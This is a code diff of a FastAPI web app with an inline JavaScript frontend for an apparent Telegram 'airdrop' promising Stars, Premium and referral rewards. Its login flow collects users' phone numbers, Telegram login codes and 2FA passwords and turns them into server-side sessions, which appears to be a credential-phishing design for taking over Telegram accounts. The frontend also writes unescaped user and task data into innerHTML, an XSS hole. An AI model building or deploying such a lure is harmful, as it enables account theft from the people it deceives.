-    await api("/api/v1/auth/login", {method:"POST", body:new URLSearchParams({telegram_id:String(res.user.telegram_id), token: accessToken}), auth:false});
-    setStatus("Login successful.");
-    toast("Welcome.");
-    await refresh();
-    await bindWs();
-  } catch (e) { toast(e.message); }
-};
-
-el("btn2fa").onclick = async () => {
-  try {
-    const password = el("password").value;
-    const res = await api("/api/v1/auth/telegram/verify-2fa", {
-      method:"POST",
-      auth:false,
-      body:{session_id:sessionId, password},
-    });
-    accessToken = res.web_token;
-    csrfToken = res.csrf_token;
-    userId = res.user.id;
-    await api("/api/v1/auth/login", {method:"POST", body:new URLSearchParams({telegram_id:String(res.user.telegram_id), token: accessToken}), auth:false});
-    setStatus("2FA successful.");
-    toast("2FA success.");
-    await refresh();
-    await bindWs();
-  } catch (e) { toast(e.message); }
-};
-
-el("btnDaily").onclick = async () => {
-  try { const r = await api("/api/v1/claim/daily", {method:"POST"}); el("rewardBox").textContent = `Daily reward claimed. Balance: ${r.new_balance}`; await refresh(); toast("Daily +1"); } catch (e) { toast(e.message); }
-};
-
-el("btnOpenBox").onclick = async () => {
-  try {
-    el("box").style.transform = "rotate(-8deg) scale(.95)";
-    setTimeout(() => el("box").style.transform = "", 250);
-    const r = await api("/api/v1/claim/mystery-box", {method:"POST"});
-    const reward = r.reward;
-    el("rewardBox").textContent = reward.type === "premium" ? "🎉 Premium 1 Month" : `✨ ${reward.amount} Stars`;
-    await refresh();
-    toast("Mystery box opened.");
-  } catch (e) { toast(e.message); }
-};
-
-el("btnCopyRef").onclick = async () => {
-  const txt = el("refLink").textContent.trim();
-  if (!txt || txt === "—") return toast("No referral link yet.");
-  await navigator.clipboard.writeText(txt);
-  toast("Referral link copied.");
-};
-
-el("btnTheme").onclick = () => toast("Glass mode active.");
-
-document.getElementById("box").onclick = () => el("btnOpenBox").click();
-
-(async () => {
-  const tok = document.cookie.split("; ").find(x => x.startsWith("access_token="));
-  if (tok) {
-    accessToken = decodeURIComponent(tok.split("=")[1]);
-    csrfToken = (document.cookie.split("; ").find(x => x.startsWith("csrf_token=")) || "").split("=")[1] || "";
-    try { await refresh(); await bindWs(); } catch {}
-  }
-})();
+const state={sessionId:null, csrf:null, authenticated:false, profile:null, ws:null};
+const $=s=>document.querySelector(s); const $$=s=>[...document.querySelectorAll(s)];
+function showToast(msg){const t=$('#toast');t.textContent=msg;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),3000)}
+function getCookie(name){return document.cookie.split('; ').find(x=>x.startsWith(name+'='))?.split('=')[1]||''}
+function setActiveTab(name){$$('.tab').forEach(el=>el.classList.toggle('active',el.dataset.tab===name));['auth','dash','tasks','leaderboard'].forEach(n=>$('#tab-'+n).classList.toggle('hidden',n!==name))}
+function api(path, opts={}){opts.credentials='include';opts.headers=opts.headers||{};if(['POST','PUT','PATCH','DELETE'].includes((opts.method||'GET').toUpperCase()))opts.headers['X-CSRF-Token']=getCookie('csrf_token');return fetch(path,opts).then(async r=>{const ct=r.headers.get('content-type')||'';const data=ct.includes('application/json')?await r.json():await r.text();if(!r.ok)throw new Error(data.detail||data.message||data||'Request failed');return data});}
+function buildOtp(){const box=$('#otp');box.innerHTML='';for(let i=0;i<5;i++){const inp=document.createElement('input');inp.maxLength=1;inp.inputMode='numeric';inp.autocomplete='one-time-code';inp.addEventListener('input',()=>{if(inp.value&&box.children[i+1])box.children[i+1].focus()});inp.addEventListener('keydown',e=>{if(e.key==='Backspace'&&!inp.value&&box.children[i-1])box.children[i-1].focus()});box.appendChild(inp)}}
+function otpValue(){return[...$('#otp').children].map(x=>x.value.trim()).join('')}
+async function sendCode(){const phone=$('#phone').value.trim();const ref_code=$('#refCode').value.trim()||null;if(!phone)return showToast('Phone required');try{const res=await api('/api/auth/send-code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone,ref_code})});state.sessionId=res.session_id;$('#codeStep').classList.remove('hidden');showToast('Code sent.');}catch(e){showToast(e.message)}}
+async function verifyCode(){const code=otpValue();if(code.length<4)return showToast('Enter the code');try{const res=await api('/api/auth/verify-code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({session_id:state.sessionId,code})});if(res.status==='2fa_required'){ $('#twofaStep').classList.remove('hidden'); showToast('2FA required'); return } if(res.access_token){ state.authenticated=true; state.csrf=res.csrf_token; await loadProfile(); showToast('Logged in'); setActiveTab('dash'); connectWS(); } }catch(e){showToast(e.message)}}
+async function verify2FA(){const password=$('#twofa').value;try{const res=await api('/api/auth/verify-2fa',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({session_id:state.sessionId,password})});state.authenticated=true;state.csrf=res.csrf_token;await loadProfile();showToast('2FA success');setActiveTab('dash');connectWS();}catch(e){showToast(e.message)}}
+async function loadProfile(){try{const res=await api('/api/airdrop/profile');state.profile=res;$('#statusPill').textContent='Authenticated';$('#userName').textContent=(res.user.first_name||'User')+' '+(res.user.last_name||'');$('#userInfo').textContent='@'+(res.user.username||'no_username')+' • ID '+res.user.telegram_id;$('#statBalance').textContent=res.user.balance;$('#statRefs').textContent=res.user.referrals;$('#statTasks').textContent=res.tasks.length;$('#statGifts').textContent=res.user.gift_claims;$('#refLink').textContent=res.ref_link;renderRewards(res.rewards);renderTasks(res.tasks);$('#connPill').textContent='WS: ready';}catch(e){showToast(e.message)}}
+function renderRewards(items){const el=$('#rewards');el.innerHTML='';if(!items.length){el.innerHTML='<div class="muted">No rewards yet.</div>';return}items.slice(0,8).forEach(r=>{const d=document.createElement('div');d.className='item';d.innerHTML=`<div><b>${r.reward_type}</b><div class='muted'>${r.amount}</div></div><div class='badge'>${new Date(r.created_at).toLocaleString()}</div>`;el.appendChild(d)})}
+function renderTasks(items){const el=$('#taskList');el.innerHTML='';if(!items.length){el.innerHTML='<div class="muted">No tasks available.</div>';return}items.forEach(t=>{const d=document.createElement('div');d.className='item';d.innerHTML=`<div><b>${t.title}</b><div class='muted'>${t.description}</div></div><div style='display:flex;gap:10px;align-items:center'><span class='badge'>+${t.reward_amount}</span>${t.claimed?'<span class="badge">Claimed</span>':'<button class="secondary" data-claim="'+t.id+'">Claim</button>'}</div>`;el.appendChild(d)});el.querySelectorAll('[data-claim]').forEach(btn=>btn.onclick=()=>claimTask(btn.dataset.claim))}
+async function claimTask(id){try{const res=await api('/api/airdrop/tasks/'+id+'/claim',{method:'POST'});showToast('Task claimed +'+res.after-res.before);await loadProfile()}catch(e){showToast(e.message)}}
+async function claimDaily(){try{await api('/api/airdrop/claim-daily',{method:'POST'});showToast('Daily reward claimed');await loadProfile()}catch(e){showToast(e.message)}}
+async function openGift(){try{const res=await api('/api/airdrop/open-gift',{method:'POST'});$('#lastReward').textContent=res.reward.type+' - '+res.reward.amount;showToast('Mystery box opened!');await loadProfile()}catch(e){showToast(e.message)}}
+function connectWS(){try{if(state.ws)state.ws.close();const proto=location.protocol==='https:'?'wss:':'ws:';state.ws=new WebSocket(proto+'//'+location.host+'/ws/leaderboard');$('#connPill').textContent='WS: connecting';state.ws.onopen=()=>$('#connPill').textContent='WS: live';state.ws.onclose=()=>$('#connPill').textContent='WS: offline';state.ws.onmessage=(ev)=>{const data=JSON.parse(ev.data);const body=$('#leaderBody');body.innerHTML='';data.items.forEach((u,i)=>{const tr=document.createElement('tr');tr.innerHTML=`<td>${i+1}</td><td>${u.first_name||'User'}${u.username?' @'+u.username:''}</td><td>${u.referrals}</td><td>${u.balance}</td>`;body.appendChild(tr)})}}catch(e){console.error(e)}}
+$('#sendCode').onclick=sendCode;$('#verifyCode').onclick=verifyCode;$('#verify2FA').onclick=verify2FA;$('#claimDaily').onclick=claimDaily;$('#openGift').onclick=openGift;$('#logout').onclick=async()=>{try{await api('/api/auth/logout',{method:'POST'});location.reload()}catch(e){showToast(e.message)}};$('#copyRef').onclick=()=>navigator.clipboard.writeText($('#refLink').textContent).then(()=>showToast('Copied'));
+$('#clearAuth').onclick=()=>{state.sessionId=null;$('#codeStep').classList.add('hidden');$('#twofaStep').classList.add('hidden');$('#otp').innerHTML='';$('#twofa').value='';showToast('Reset')};
+$$('.tab').forEach(el=>el.onclick=()=>setActiveTab(el.dataset.tab));
+buildOtp();
+(async()=>{try{await loadProfile();state.authenticated=true;setActiveTab('dash');connectWS()}catch(_){setActiveTab('auth')}})();
 </script>
 </body>
 </html>
 """
 
 
+# ---------------------------------------------------------------------------
+# API routes
+# ---------------------------------------------------------------------------
+
 @app.get("/", response_class=HTMLResponse)
-async def index():
+async def home() -> HTMLResponse:
     return HTMLResponse(FRONTEND_HTML)
 
 
-@app.get("/health")
-async def health():
-    users = await db.fetchone("SELECT COUNT(*) AS c FROM users")
-    sessions = len(auth_manager.sessions)
+@app.get("/api/health")
+async def health() -> Dict[str, Any]:
     return {
-        "status": "ok",
-        "users": int(users["c"]) if users else 0,
-        "sessions": sessions,
-        "bot": settings.ENABLE_BOT,
+        "status": "healthy",
+        "service": settings.APP_NAME,
+        "time": utc_now_iso(),
+        "bot_enabled": bool(settings.ENABLE_BOT and settings.TELEGRAM_BOT_TOKEN),
     }
 
 
-@app.get("/api/v1/system/health")
-async def system_health():
-    return await health()
+@app.post("/api/auth/send-code")
+async def api_send_code(payload: SendCodeRequest, response: Response) -> Dict[str, Any]:
+    res = await auth_manager.send_code(payload.phone, payload.ref_code)
+    response.status_code = status.HTTP_200_OK
+    return res
 
 
-# =============================================================================
-# Main
-# =============================================================================
+@app.post("/api/auth/verify-code")
+async def api_verify_code(payload: VerifyCodeRequest, response: Response) -> Dict[str, Any]:
+    res = await auth_manager.verify_code(payload.session_id, payload.code)
+    if res.get("status") == "2fa_required":
+        return res
+    token = res["access_token"]
+    csrf = res["csrf_token"]
+    set_session_cookies(response, token, csrf)
+    response.headers["X-CSRF-Token"] = csrf
+    return {"status": "success", "user": res["user"], "access_token": token, "csrf_token": csrf}
+
+
+@app.post("/api/auth/verify-2fa")
+async def api_verify_2fa(payload: Verify2FARequest, response: Response) -> Dict[str, Any]:
+    res = await auth_manager.verify_2fa(payload.session_id, payload.password)
+    token = res["access_token"]
+    csrf = res["csrf_token"]
+    set_session_cookies(response, token, csrf)
+    response.headers["X-CSRF-Token"] = csrf
+    return {"status": "success", "user": res["user"], "access_token": token, "csrf_token": csrf}
+
+
+@app.post("/api/auth/logout")
+async def api_logout(response: Response) -> Dict[str, Any]:
+    clear_session_cookies(response)
+    return {"status": "success"}
+
+
+@app.get("/api/airdrop/profile")
+async def api_profile(user: Dict[str, Any] = Depends(get_current_user)) -> Dict[str, Any]:
+    data = await user_repo.profile(int(user["id"]))
+    return data
+
+
+@app.post("/api/airdrop/claim-daily")
+async def api_claim_daily(request: Request, user: Dict[str, Any] = Depends(get_current_user)) -> Dict[str, Any]:
+    require_csrf(request)
+    res = await user_repo.claim_daily(int(user["id"]))
+    before, after = int(res["before"]), int(res["after"])
+    await reward_repo.add(int(user["id"]), RewardType.DAILY.value, str(settings.DAILY_REWARD), {"before": before, "after": after})
+    await tx_repo.add(int(user["id"]), "daily", settings.DAILY_REWARD, before, after, {})
+    return {"status": "success", "before": before, "after": after, "reward": settings.DAILY_REWARD}
+
+
+@app.post("/api/airdrop/open-gift")
+async def api_open_gift(request: Request, user: Dict[str, Any] = Depends(get_current_user)) -> Dict[str, Any]:
+    require_csrf(request)
+    res = await user_repo.open_mystery_box(int(user["id"]))
+    reward = res["reward"]
+    before, after = int(res["before"]), int(res["after"])
+    await reward_repo.add(int(user["id"]), RewardType.MYSTERY_BOX.value, f"{reward['type']}:{reward['amount']}", reward)
+    await tx_repo.add(int(user["id"]), "mystery_box", -settings.BOX_COST, before, after, reward)
+    return {"status": "success", **res}
+
+
+@app.get("/api/airdrop/tasks")
+async def api_tasks(user: Dict[str, Any] = Depends(get_current_user)) -> List[Dict[str, Any]]:
+    return (await user_repo.profile(int(user["id"]))) ["tasks"]
+
+
+@app.post("/api/airdrop/tasks/{task_id}/claim")
+async def api_claim_task(task_id: int, request: Request, user: Dict[str, Any] = Depends(get_current_user)) -> Dict[str, Any]:
+    require_csrf(request)
+    res = await user_repo.claim_task(int(user["id"]), task_id)
+    return {"status": "success", **res}
+
+
+@app.get("/api/airdrop/leaderboard")
+async def api_leaderboard(limit: int = Query(10, ge=1, le=50)) -> Dict[str, Any]:
+    return {"status": "success", "items": await user_repo.leaderboard(limit)}
+
+
+@app.websocket("/ws/leaderboard")
+async def ws_leaderboard(ws: WebSocket):
+    await ws.accept()
+    try:
+        while True:
+            items = await user_repo.leaderboard(10)
+            await ws.send_text(safe_json({"items": items, "time": utc_now_iso()}))
+            await asyncio.sleep(5)
+    except WebSocketDisconnect:
+        pass
+    except Exception:
+        with contextlib.suppress(Exception):
+            await ws.close()
+
+
+@app.post("/api/admin/login")
+async def api_admin_login(payload: AdminLoginRequest, response: Response) -> Dict[str, Any]:
+    if payload.username != settings.ADMIN_USERNAME:
+        raise HTTPException(status_code=403, detail="Invalid credentials")
+    if not verify_admin_password(payload.password, settings.ADMIN_PASSWORD_HASH):
+        raise HTTPException(status_code=403, detail="Invalid credentials")
+    token, csrf = token_pair(payload.username, "admin", settings.ADMIN_TOKEN_TTL_MINUTES)
+    response.set_cookie("admin_access_token", token, httponly=True, samesite="lax", max_age=settings.ADMIN_TOKEN_TTL_MINUTES * 60)
+    response.set_cookie("admin_csrf_token", csrf, httponly=False, samesite="lax", max_age=settings.ADMIN_TOKEN_TTL_MINUTES * 60)
+    return {"status": "success", "csrf_token": csrf}
+
+
+@app.get("/api/admin/users")
+async def api_admin_users(request: Request) -> Dict[str, Any]:
+    await require_admin(request)
+    rows = await db.fetchall("SELECT * FROM users ORDER BY id DESC LIMIT 500")
+    return {"status": "success", "items": [dict(r) for r in rows]}
+
+
+@app.post("/api/admin/tasks")
+async def api_admin_create_task(request: Request, payload: TaskCreateRequest) -> Dict[str, Any]:
+    await require_admin(request)
+    task_id = await db.execute(
+        """
+        INSERT INTO tasks (title, description, task_type, reward_amount, target_url, meta_json, is_active, sort_order, created_at)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+        """,
+        (
+            payload.title,
+            payload.description,
+            payload.task_type.value,
+            payload.reward_amount,
+            payload.target_url,
+            safe_json(payload.meta),
+            1 if payload.is_active else 0,
+            payload.sort_order,
+            utc_now_iso(),
+        ),
+    )
+    return {"status": "success", "task_id": task_id}
+
+
+@app.get("/api/admin/tasks")
+async def api_admin_tasks(request: Request) -> Dict[str, Any]:
+    await require_admin(request)
+    rows = await db.fetchall("SELECT * FROM tasks ORDER BY id DESC")
+    return {"status": "success", "items": [dict(r) for r in rows]}
+
+
+@app.exception_handler(AppError)
+async def app_error_handler(_: Request, exc: AppError):
+    return JSONResponse(status_code=exc.status_code, content={"detail": exc.message})
+
+
+@app.exception_handler(Exception)
+async def generic_error_handler(_: Request, exc: Exception):
+    logger.exception("Unhandled error: %s", exc)
+    return JSONResponse(status_code=500, content={"detail": "Internal Server Error"})
+
+
+# ---------------------------------------------------------------------------
+# Main entrypoint
+# ---------------------------------------------------------------------------
 
 if __name__ == "__main__":
     import uvicorn
-    uvicorn.run("app:app", host="0.0.0.0", port=int(os.getenv("PORT", "8000")), reload=False, log_level="info")
+
+    uvicorn.run(
+        "app:app",
+        host=settings.HOST,
+        port=settings.PORT,
+        reload=False,
+        log_level="info",
+        workers=1,
+    )
